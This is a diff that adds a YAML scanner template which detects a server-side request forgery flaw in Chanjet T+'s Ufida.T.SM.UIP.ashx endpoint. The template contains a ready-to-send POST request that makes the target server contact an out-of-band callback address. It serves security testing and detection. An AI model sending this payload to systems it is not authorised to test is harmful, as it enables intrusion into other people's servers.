@@ -1,0 +1,23 @@
+id: poc-yaml-chanjet-tplus-ufida-t-sm-uip-ashx-ssrf
+info:
+  name: Chanjet T+ Ufida.T.SM.UIP.ashx SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+  description: |
+    This template detects a Server-Side Request Forgery (SSRF) vulnerability in Chanjet T+'s Ufida.T.SM.UIP.ashx endpoint.
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"address":"{{interactsh-url}}"}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
